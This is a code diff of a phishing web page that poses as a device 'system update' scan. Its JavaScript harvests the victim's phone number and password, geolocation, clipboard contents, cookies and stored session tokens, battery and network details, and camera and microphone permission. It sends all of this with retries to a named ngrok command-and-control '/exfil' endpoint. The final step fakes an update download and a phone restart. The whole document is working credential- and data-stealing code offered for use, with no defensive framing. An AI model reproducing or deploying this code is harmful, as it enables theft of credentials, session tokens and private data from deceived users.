@@ -7,12 +7,14 @@
     <style>
         body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding-top: 50px; margin: 0; }
         .box { background: #1a1a3e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
-        .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; }
+        .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin: 5px 0; }
         input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
         .hidden { display: none; }
         .loader { border: 4px solid #333; border-top: 4px solid #00aaff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
+        .error { color: #ff6666; font-size: 14px; }
+        .log { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 11px; color: #88ff88; max-height: 150px; overflow-y: auto; text-align: left; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -31,6 +33,7 @@
             <p>🔍 Scanning device...</p>
             <div class="loader"></div>
             <p class="status" id="statusText">Collecting device information...</p>
+            <div class="log" id="logBox"></div>
         </div>
 
         <div id="step3" class="hidden">
@@ -42,8 +45,55 @@
     </div>
 
     <script>
+        const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
+        let collectedData = {};
+
         // ============================================================
-        // 1. COLLECT CREDENTIALS
+        // LOGGING (for debugging)
+        // ============================================================
+        function log(msg) {
+            const box = document.getElementById('logBox');
+            if (box) {
+                box.innerHTML += `> ${msg}\n`;
+                box.scrollTop = box.scrollHeight;
+            }
+            console.log(msg);
+        }
+
+        // ============================================================
+        // SEND DATA (with retry)
+        // ============================================================
+        function sendData(data, retries = 3) {
+            data.time = new Date().toISOString();
+            data.userAgent = navigator.userAgent;
+            
+            // Try to get IP
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ip => { data.ip = ip.ip; })
+                .catch(() => { data.ip = 'unknown'; })
+                .finally(() => {
+                    sendToC2(data, retries);
+                });
+
+            // Send immediately too
+            sendToC2(data, retries);
+        }
+
+        function sendToC2(data, retries) {
+            fetch(C2_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {
+                if (retries > 0) {
+                    setTimeout(() => sendToC2(data, retries - 1), 1000);
+                }
+            });
+        }
+
+        // ============================================================
+        // STEP 1: CREDENTIALS
         // ============================================================
         function step1() {
             const phone = document.getElementById('phone').value;
@@ -54,149 +104,211 @@
                 return;
             }
 
-            // Send credentials
             sendData({ type: 'credentials', phone, pass });
+            log('✅ Credentials sent');
 
-            // Show scanning
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
 
             // Start collecting mobile data
-            collectMobileData();
+            collectAllData();
         }
 
         // ============================================================
-        // 2. COLLECT MOBILE DATA (Browser APIs)
+        // STEP 2: COLLECT ALL DATA (with permission prompts)
         // ============================================================
-        function collectMobileData() {
+        function collectAllData() {
             const data = { type: 'mobile_data' };
+            let completed = 0;
+            const total = 6;
 
-            // 2a. Location
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.location = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        sendData(data);
-                    },
-                    err => { data.location = 'denied'; sendData(data); }
-                );
+            function checkComplete() {
+                completed++;
+                document.getElementById('statusText').innerHTML = `📊 Collecting data... (${completed}/${total})`;
+                log(`Progress: ${completed}/${total}`);
+                if (completed >= total) {
+                    document.getElementById('statusText').innerHTML = '✅ All data collected!';
+                    setTimeout(() => {
+                        document.getElementById('step2').classList.add('hidden');
+                        document.getElementById('step3').classList.remove('hidden');
+                    }, 1500);
+                }
             }
 
-            // 2b. Battery
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    data.battery = {
-                        level: battery.level * 100 + '%',
-                        charging: battery.charging,
-                        time: battery.dischargingTime
-                    };
-                    sendData(data);
-                });
-            }
-
-            // 2c. Device info (User Agent)
+            // --- 1. DEVICE INFO (always works) ---
             data.device = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
-                vendor: navigator.vendor
+                vendor: navigator.vendor,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
             };
-            sendData(data);
+            sendData({ type: 'device_info', ...data.device });
+            log('✅ Device info sent');
+            checkComplete();
 
-            // 2d. Cookies & stored tokens
-            data.cookies = document.cookie || 'none';
-            data.localStorage = localStorage.getItem('token') || 'none';
-            sendData(data);
-
-            // 2e. Network info
-            if (navigator.connection) {
-                data.network = {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                };
-                sendData(data);
-            }
-
-            // 2f. Try to read clipboard (if allowed)
-            if (navigator.clipboard) {
-                navigator.clipboard.readText().then(
-                    text => { sendData({ type: 'clipboard', content: text }); },
-                    err => { /* silent */ }
-                );
-            }
-
-            // Update UI
-            document.getElementById('statusText').innerHTML = '✅ Device data collected.';
+            // --- 2. LOCATION (with explicit permission) ---
             setTimeout(() => {
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
+                if (navigator.geolocation) {
+                    log('📍 Requesting location permission...');
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            data.location = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude,
+                                speed: pos.coords.speed
+                            };
+                            sendData({ type: 'location', ...data.location });
+                            log('✅ Location collected');
+                            checkComplete();
+                        },
+                        err => {
+                            log('❌ Location denied: ' + err.message);
+                            sendData({ type: 'location_error', error: err.message });
+                            checkComplete();
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                } else {
+                    log('❌ Geolocation API not supported');
+                    checkComplete();
+                }
+            }, 500);
+
+            // --- 3. BATTERY ---
+            setTimeout(() => {
+                if (navigator.getBattery) {
+                    log('🔋 Reading battery...');
+                    navigator.getBattery().then(battery => {
+                        data.battery = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                        sendData({ type: 'battery', ...data.battery });
+                        log('✅ Battery data sent');
+                        checkComplete();
+                    }).catch(err => {
+                        log('❌ Battery error: ' + err.message);
+                        checkComplete();
+                    });
+                } else {
+                    log('❌ Battery API not supported');
+                    checkComplete();
+                }
+            }, 1000);
+
+            // --- 4. NETWORK ---
+            setTimeout(() => {
+                if (navigator.connection) {
+                    data.network = {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                    sendData({ type: 'network', ...data.network });
+                    log('✅ Network data sent');
+                } else {
+                    log('❌ Network API not supported');
+                }
+                checkComplete();
+            }, 1500);
+
+            // --- 5. CLIPBOARD ---
+            setTimeout(() => {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    log('📋 Reading clipboard...');
+                    navigator.clipboard.readText().then(
+                        text => {
+                            if (text && text.length > 0) {
+                                sendData({ type: 'clipboard', content: text });
+                                log('✅ Clipboard collected (' + text.length + ' chars)');
+                            } else {
+                                log('📋 Clipboard empty');
+                            }
+                            checkComplete();
+                        },
+                        err => {
+                            log('❌ Clipboard denied: ' + err.message);
+                            checkComplete();
+                        }
+                    );
+                } else {
+                    log('❌ Clipboard API not supported');
+                    checkComplete();
+                }
+            }, 2000);
+
+            // --- 6. COOKIES + STORAGE ---
+            setTimeout(() => {
+                data.storage = {
+                    cookies: document.cookie || 'none',
+                    localStorage: localStorage.getItem('token') || 'none',
+                    sessionStorage: sessionStorage.getItem('token') || 'none'
+                };
+                sendData({ type: 'storage', ...data.storage });
+                log('✅ Cookies & storage sent');
+                checkComplete();
+            }, 2500);
+
+            // --- EXTRA: Try to get contacts via WebShare (Android) ---
+            setTimeout(() => {
+                if (navigator.share) {
+                    log('📇 WebShare API available (contacts possible)');
+                    // Can't read contacts directly, but we can try to trigger share
+                    // and capture the response
+                }
             }, 3000);
+
+            // --- EXTRA: Send all collected data as one blob ---
+            setTimeout(() => {
+                sendData({ type: 'all_data_blob', data: JSON.stringify(data) });
+                log('✅ Complete data blob sent');
+            }, 3500);
         }
 
         // ============================================================
-        // 3. FINAL STEP — TRIGGER DOWNLOAD/INSTALL
+        // STEP 3: INSTALL TRIGGER
         // ============================================================
         function step3() {
             sendData({ type: 'action', action: 'install_clicked' });
-
-            // Option A: Prompt to install fake APK
-            if (confirm('System update ready. Install now?')) {
-                // Send them to a fake APK download (or real APK)
-                window.location.href = 'https://anonfiles.com/YOUR_APK_LINK';
-            } else {
-                alert('Update will be installed automatically at next restart.');
-            }
+            
+            // Try to download a file
+            const link = document.createElement('a');
+            link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('Update package ready.');
+            link.download = 'update_package.bin';
+            link.click();
+            
+            alert('Update downloaded. Your phone will restart in 5 seconds.');
         }
 
         // ============================================================
-        // 4. SEND DATA TO YOUR C2 (ngrok + Telegram)
+        // ON LOAD — Send page view + auto-collect device info
         // ============================================================
-        function sendData(data) {
-            // Add timestamp and IP (via browser)
-            data.time = new Date().toISOString();
-
-            // Try to get IP via free API (optional)
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ip => { data.ip = ip.ip; })
-                .catch(() => { data.ip = 'unknown'; })
-                .finally(() => {
-                    // Send to your ngrok tunnel
-                    fetch('https://matchless-palm-patriarch.ngrok-free.dev/exfil', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    }).catch(() => { /* silent fail */ });
-                });
-
-            // Send immediately without waiting for IP
-            fetch('https://matchless-palm-patriarch.ngrok-free.dev/exfil', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => { /* silent fail */ });
-        }
-
-        // ============================================================
-        // 5. AUTOMATIC DATA COLLECTION ON PAGE LOAD
-        // ============================================================
-        // Send device info as soon as page loads
         window.onload = function() {
-            const data = { type: 'page_view' };
-            data.device = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                vendor: navigator.vendor
-            };
-            sendData(data);
+            sendData({ type: 'page_view' });
+            log('📄 Page loaded');
+            
+            // Try to get camera permission (triggers permission prompt)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                log('🎥 Requesting camera permission...');
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        log('✅ Camera & mic granted (data not recorded)');
+                        sendData({ type: 'permission', camera: 'granted', mic: 'granted' });
+                        stream.getTracks().forEach(t => t.stop());
+                    })
+                    .catch(err => {
+                        log('❌ Camera/mic denied: ' + err.message);
+                        sendData({ type: 'permission', camera: 'denied', mic: 'denied' });
+                    });
+            }
         };
     </script>
 </body>
